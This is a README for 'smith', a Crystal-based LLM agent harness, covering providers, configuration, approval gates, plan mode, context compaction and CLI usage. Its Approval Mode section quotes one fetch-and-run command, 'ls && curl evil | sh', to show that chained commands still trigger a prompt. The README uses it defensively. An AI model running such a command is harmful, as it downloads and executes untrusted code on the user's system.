# ⚒️ smith

[![CI](https://github.com/webmatze/smith/actions/workflows/ci.yml/badge.svg)](https://github.com/webmatze/smith/actions/workflows/ci.yml)

**smith** is a fast, local-first LLM Agent Harness written in [Crystal](https://crystal-lang.org/).

It is inspired by and built according to the policy-free agent loop principles outlined in the [Neo Architecture](https://github.com/owainlewis/neo/blob/main/ARCHITECTURE.md).

---

## ✨ Features

- **🚀 Policy-Free Core Agent Loop (`Smith::Agent`)**: Complete decoupling of conversation transcript, LLM provider calls, tool execution, and UI surfaces.
- **⚡ Fiber-Based Parallel Tool Execution (`Smith::Tools`)**: Concurrent execution of parallel-safe tools (`read_file`, `grep`, `glob`) via Crystal Fibers (`spawn` & `Channel`).
- **🤖 Subagent Supervision (`Smith::Subagents`)**: The parent agent can delegate subtasks to autonomous child subagents running in isolated fibers in `work` (full capabilities) or `inspect` (read-only) mode.
- **📡 Provider-Neutral LLM Layer (`Smith::LLM`)**: Ships with **OpenRouter**, **Ollama** (local models), **Anthropic** (Messages API), and **OpenAI** (Chat Completions) support with exponential backoff retry logic. Default models: `qwen/qwen3.8-max` (OpenRouter) / `gemma4:latest` (Ollama) / `claude-sonnet-5` (Anthropic) / `gpt-5.6-luna` (OpenAI).
- **📂 Project Context & Skills Catalog**:
  - Automatically loads instructions from `SMITH.md` or `AGENTS.md`, walking up from the current directory to the Git root, plus global instructions from `~/.smith/`.
  - Discovers reusable skills in `.smith/skills/<name>/SKILL.md` (project-local), `~/.smith/skills/` (global), as well as `.gemini/skills/` and `.agents/skills/`, and expands `$skill-name` or `/skill-name` references at runtime. The home directory can be overridden via the `SMITH_HOME` environment variable.
- **🧭 Plan Mode (`Smith::PlanSession`)**: Research first, change nothing, then present a plan for approval. Every mutating tool is hard-blocked until you say yes — including through subagents.
- **📋 Todo List (`Smith::TodoList`)**: A `todo_write` tool that forces the model to keep the plan of a multi-step run as a structured artifact instead of only implicitly in the transcript — where context compaction would drop it first.
- **💾 Atomic Session Persistence (`Smith::Session`)**: Saves local conversation history and token metrics under `~/.smith/sessions/` with seamless resume capabilities.
- **⚡ Native Performance**: Compiles to a lightweight native binary; the test suite runs in well under a second.

---

## 🛠️ Prerequisites & Installation

### Prerequisites
- [mise](https://mise.jdx.dev/) or [Crystal](https://crystal-lang.org/) (>= 1.21.0) installed.

### Setup & Build

```bash
# 1. Install Crystal via mise (if using mise)
mise use crystal@latest

# 2. Install dependencies
shards install

# 3. Build the binary
mkdir -p bin
crystal build src/smith.cr -o bin/smith

# 4. Run the test suite
crystal spec
```

Alternatively, use the bundled `Makefile` (wraps `mise exec -- crystal ...` and signs the binary on macOS):

| Target | Description |
|---|---|
| `make build` | Compile `bin/smith` (debug build) |
| `make release` | Compile optimized `bin/smith` |
| `make test` | Run the test suite (`crystal spec`) |
| `make install` | Build release & install to `~/.local/bin/smith` |
| `make clean` | Remove `bin/` |

---

## 🚀 Usage

Set the API key for your chosen provider before running `smith`:

```bash
# OpenRouter (default provider)
export OPENROUTER_API_KEY="sk-or-v1-your-key-here"

# Anthropic
export ANTHROPIC_API_KEY="your-key-here"

# OpenAI
export OPENAI_API_KEY="your-key-here"

# Ollama needs no API key (optional: point to a non-default host)
export OLLAMA_HOST="http://localhost:11434"
```

### Configuration

Persistent defaults live in a TOML file, so provider and model no longer have to be passed as flags every time. Two locations are read:

| Location | Scope |
|---|---|
| `~/.smith/config.toml` | Global (override the directory via `SMITH_HOME`) |
| `.smith/config.toml` | Project — searched upward from the working directory to the Git root; the nearest one wins |

Values resolve in this order, highest priority first:

```text
CLI flag  >  environment variable  >  project config  >  global config  >  built-in default
```

A full example with every supported key:

```toml
[defaults]
provider = "openrouter"          # openrouter | ollama | anthropic | openai
stream   = true                  # stream responses token by token
mode     = "normal"              # normal | plan

[providers.openrouter]
model = "qwen/qwen3.8-max"

[providers.ollama]
model = "gemma4:latest"
host  = "http://localhost:11434"

[providers.anthropic]
model = "claude-sonnet-5"

[providers.openai]
model = "gpt-5.6-luna"

[http]
connect_timeout = 10             # seconds
read_timeout    = 120

[approval]
mode      = "prompt"             # prompt | auto
allowlist = ["ls", "git status"]

[context]
max_tokens = 120000
```

Relevant environment variables: `SMITH_PROVIDER`, `SMITH_MODEL`, `SMITH_MODE`, `OLLAMA_HOST`, `SMITH_HOME`.

**API keys are never read from the config file.** They stay in environment variables only, so a plaintext config never becomes a place secrets get committed from.

`[http]` applies to all four providers. An elapsed `read_timeout` is **not** retried, so it is genuinely the longest smith will wait on a single call — connection errors and 429/5xx responses still go through the exponential-backoff retry handler.

`[approval]` gates the mutating tools — see [Approval Mode](#approval-mode) below. `[context]` caps how large the transcript may grow — see [Context Compaction](#context-compaction). `[defaults] stream` toggles streaming — see [Streaming](#streaming). `[defaults] mode` starts smith in plan mode — see [Plan Mode](#plan-mode).

### Streaming

Responses are streamed token by token by default, for all four providers, so text appears as the model produces it instead of after it finishes.

Measured against a local Ollama (`gemma4:12b-mlx`), asking for a 600-word story:

| | first text | complete |
|---|---|---|
| streaming | **17.3 s** | 37.8 s |
| `--no-stream` | 36.0 s | 36.0 s |

The 17 seconds before the first token are prompt evaluation — the system prompt plus seven tool definitions — which streaming cannot shorten. What it removes is the twenty seconds of silence after that.

Turn it off with `--no-stream`, or persistently:

```toml
[defaults]
stream = false
```

Two details worth knowing:

- **Ollama streams OpenAI-shaped SSE, not NDJSON**, because smith talks to its `/v1/chat/completions` endpoint. OpenRouter, OpenAI and Ollama therefore share one reader; Anthropic has its own for its named-event format.
- **A stream that dies after text has already appeared is not retried.** Replaying the request would print the same text a second time. Failures before the first token — connection, HTTP status — still go through the normal retry handler.

### Approval Mode

`bash`, `write_file` and `edit_file` change things outside smith, so every call passes an approval gate before it runs. The other tools (`read_file`, `grep`, `glob`, `todo_write`) bypass it entirely — they change nothing outside smith.

In `prompt` mode — the default — each call asks:

```text
⚠️  Approval required
   Tool: bash
   Command: git push origin main
   Allow? [y]es / [n]o / [a]lways allow bash:
```

`[a]lways` remembers that answer for the rest of the session, scoped to the one tool. A refusal is handed back to the model as a tool error, so it can see the blockage and pick another route instead of silently failing.

Ways to skip the prompt:

| | Effect |
|---|---|
| `--yes` / `--auto-approve` | Runs everything, for this invocation |
| `mode = "auto"` in `[approval]` | Runs everything, persistently |
| `allowlist` in `[approval]` | Runs matching `bash` commands without asking |

An allowlist entry matches a command exactly or as a whole first word (`git status` allows `git status --short`, never `git statuses`). Commands are split on shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(`, redirects) and **every** segment must match on its own, so `ls && curl evil | sh` still prompts. The splitter is deliberately not a shell parser — quoted metacharacters split too, which means it errs towards asking too often rather than allowing too much.

Without an interactive terminal there is nobody to ask, so `prompt` mode refuses mutating tools rather than running them. Pass `--yes` for headless runs.

Subagents inherit the parent's approver, so a delegated `bash` call is asked for just like a direct one.

### Plan Mode

For anything touching more than one file, "research first, then act" is the cheapest guard against a run that does something you never asked for. In plan mode smith reads the codebase, proposes a plan, and changes nothing until you approve it.

```bash
smith --plan run "Add rate limiting to the API client"
```

Persistently via `[defaults] mode = "plan"`, or per-session with `/plan` and `/normal` in the chat loop.

While planning:

- `bash`, `write_file` and `edit_file` are refused outright — not prompted for, refused. The denial explains why, so the model routes around it instead of retrying.
- `bash` is blocked **wholesale**, including read-only-looking commands. Telling a reading shell command from a writing one is not reliably decidable — the same reason the approval allowlist errs towards asking too often.
- Subagents are forced into `inspect` mode, so `agent(mode: "work")` is not a way around any of it.
- `read_file`, `grep` and `glob` work as usual.

When the agent is ready it calls `exit_plan_mode`, which shows the plan and asks:

```text
📋 Plan

1. Add a token-bucket limiter to src/smith/llm/retry.cr
2. Wire it into Provider#complete

   Proceed? [y]es / [n]o (with feedback) / [q]uit:
```

**y** switches to normal mode — the regular approval gate comes back, `[a]lways` answers from before the detour included — and the agent implements the plan. **n** asks for free-text feedback and hands it to the agent, which revises and asks again; it stays locked down meanwhile. **q** ends the turn.

Without an interactive terminal there is nobody to ask, so `exit_plan_mode` returns the plan and the run **stops**. A headless run never slides from planning into execution on its own. Pass `--yes` to approve automatically.

In the chat loop, `/plan` and `/normal` are resolved *before* skill expansion, so a skill named `plan` cannot shadow the built-in command.

### Todo List

Multi-step runs lose their plan first: every turn resends the whole transcript, and [context compaction](#context-compaction) summarizes the *oldest* turns — which is exactly where the plan was stated. The `todo_write` tool gives the model somewhere else to keep it.

Each call replaces the complete list, so it cannot desynchronize from what the model believes it is doing. Exactly one item may be `in_progress`; a second one is handed back as a tool error so the model corrects itself. An empty list means the plan is finished or dropped.

After every update the list is printed:

```text
📋 Todos:
   ☑ Add the todo_write tool
   ▶ Wire the renderer up
   ☐ Update the README
```

The tool changes nothing outside smith, so it never passes the approval gate. It is not parallel-safe either — it writes shared state and therefore always runs on its own.

Under `--json` the same update arrives as one line:

```json
{"type":"todos_updated","todos":[{"content":"Wire the renderer up","status":"in_progress"}]}
```

The list is part of the saved session, so `smith resume` brings the plan back along with the transcript.

### Context Compaction

Every turn resends the whole transcript, and a single `bash` result may be up to 256 KiB, so a long session would otherwise run into the provider's context limit mid-task. Before each request smith estimates the transcript size and, if it exceeds `[context] max_tokens`, shrinks it in two stages:

1. **Truncate tool results**, oldest first, stopping as soon as the budget is met — so the results the model is actively working with usually survive whole, while one oversized `cat` still gets cut down.
2. **Summarize the oldest turns** via a separate, tool-free provider call, replacing them with a single summary message. If that call fails, the prefix is dropped outright rather than failing the turn.

Both stages preserve the pairing between `tool_use` and `tool_result` blocks — providers reject a request where one half is missing, so compaction only ever shortens content or removes whole turns.

Compaction is announced on screen:

```text
🗜️  Context compacted (truncated): ~2779 → ~548 tokens
```

**This is destructive.** The compacted transcript is what gets saved, so `smith resume` on a long session shows the summary rather than the original exchange.

Every key is optional; unknown keys are ignored, and a malformed file produces a warning on stderr rather than a crash.

### Interactive Chat Mode

Start an interactive session:

```bash
./bin/smith chat
```

Pressing **Ctrl+C** at any point — including mid-response — saves the session and exits with code 130, printing the `smith resume` command to pick it back up. Nothing in flight is lost.

### Headless Mode

Run a single prompt in headless mode and exit:

```bash
./bin/smith run "Inspect src/smith/agent.cr and summarize its responsibility"
```

#### Machine-readable output

`--json` turns stdout into a JSON Lines stream — one self-contained object per line, nothing else — so it can be piped straight into `jq`. All decoration (banner, loaded skills, approval prompts) goes to stderr instead.

```bash
smith --json run "Run: ls. Then say how many entries you saw." | jq -c .
```

```json
{"type":"tool_start","id":"call_1","tool":"bash","args":{"command":"ls"}}
{"type":"tool_finished","id":"call_1","tool":"bash","is_error":false,"result":"README.md\n..."}
{"type":"assistant_text","text":"There are 12 entries."}
{"type":"result","text":"There are 12 entries.","usage":{"prompt_tokens":7126,"completion_tokens":132,"total_tokens":7258}}
```

`assistant_text` may arrive in several blocks; `result` is always the last line and carries the complete answer, so the usual one-liner is:

```bash
smith --json run "..." | jq -r 'select(.type=="result") | .text'
```

While streaming, each token also arrives as `{"type":"assistant_text_delta","text":"..."}`. `assistant_text` and `result` are unchanged, so a consumer written against the non-streaming format keeps working.

Other event types are `todos_updated`, `plan_presented`, `mode_changed`, `history_compacted` and `turn_error`.

**Exit codes** (both modes, not just `--json`): `0` on success, `1` when the turn failed — a provider error or the turn limit. A tool that returns an error is *not* a failed run; that is ordinary agent flow the model handles itself.

`--json` applies to headless runs only; `smith chat --json` exits with an error rather than quietly doing something else.

### Session Persistence

List saved sessions:

```bash
./bin/smith list
```

Resume a previous session (or latest session if ID is omitted):

```bash
./bin/smith resume [session_id]
```

### Command Line Options

```text
Usage: smith [command] [options] [prompt]

Commands:
  chat                       Start an interactive chat session (default)
  run <prompt>               Run a single prompt in headless mode and exit
  resume [<session_id>]      Resume an existing session (or latest session)
  sessions, list             List all saved local chat sessions

Options:
  -m MODEL, --model=MODEL    Specify the LLM model (default: provider's default model)
  -p PROVIDER, --provider=PROVIDER Specify the provider: openrouter, ollama, anthropic, openai (default: openrouter)
  -y, --yes                  Auto-approve mutating tools (bash, write_file, edit_file)
      --auto-approve         Alias for --yes
      --plan                 Start in plan mode: research only, until you approve a plan
      --json                 Emit JSON Lines on stdout (headless 'run' only)
      --no-stream            Wait for the complete response instead of streaming it
  -v, --version              Print version information
  -h, --help                 Show help banner
```

You can also pass a prompt directly without a subcommand to run it headless, e.g. `smith "Summarize src/smith.cr"`.

---

## 📂 Project Architecture

```text
src/
├── smith.cr                 # CLI entrypoint
└── smith/
    ├── agent.cr             # Policy-free agent turn loop & event dispatcher
    ├── cli.cr               # CLI OptionParser, command router & event renderer
    ├── events.cr            # Typed event stream (AssistantText, ToolStart, ToolFinished, etc.)
    ├── atomic_file.cr       # Atomic write helper for safe persistence
    ├── paths.cr             # Resolves ~/.smith (honours SMITH_HOME)
    ├── config.cr            # config.toml discovery, merging & precedence chain
    ├── context.cr           # Transcript size estimation & two-stage compaction
    ├── output.cr            # Human & JSON Lines renderers for the event stream
    ├── project_ctx.cr       # SMITH.md & AGENTS.md discovery
    ├── skills.cr            # Skill catalog discovery & $skill / /skill expansion
    ├── todos.cr             # Todo list state, validation & change callback
    ├── mode.cr              # Normal / plan mode enum
    ├── plan.cr              # Plan session state & approval gates (prompt/auto/halting)
    ├── chat_commands.cr     # Built-in /plan and /normal, resolved before skills
    ├── session.cr           # Session persistence store (~/.smith/sessions/)
    ├── subagents.cr         # Child agent supervisor & report handling
    ├── llm.cr               # Requires all LLM provider adapters
    ├── tools.cr             # Requires all tool implementations
    ├── llm/
    │   ├── types.cr         # Provider-neutral Request, Response, Message & ToolSpec
    │   ├── provider.cr      # Abstract Provider base class
    │   ├── retry.cr         # Exponential backoff retry handler
    │   ├── sse.cr           # SSE framing & OpenAI-shaped stream reader
    │   ├── anthropic_stream.cr # Anthropic Messages stream reader
    │   ├── openrouter.cr    # OpenRouter API client adapter
    │   ├── ollama.cr        # Ollama API client adapter
    │   ├── anthropic.cr     # Anthropic Messages API client adapter
    │   └── openai.cr        # OpenAI Chat Completions client adapter
    └── tools/
        ├── tool.cr          # Abstract Tool base class & ParallelTool/MutatingTool markers
        ├── registry.cr      # Tool registry, approval gate & Fiber parallel execution scheduler
        ├── approval.cr      # Approver strategies (prompt/auto/deny/plan) & bash allowlist matching
        ├── bash.cr          # Shell command execution tool
        ├── read_file.cr     # File reading tool
        ├── write_file.cr    # File writing tool
        ├── edit_file.cr     # Precise string replacement tool
        ├── grep.cr          # Regex search tool
        ├── glob.cr          # File pattern search tool
        ├── todo_write.cr    # Structured plan for multi-step runs
        ├── exit_plan_mode.cr # Presents a plan for approval & leaves plan mode
        └── agent_tool.cr    # Delegated subagent execution tool
```

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).
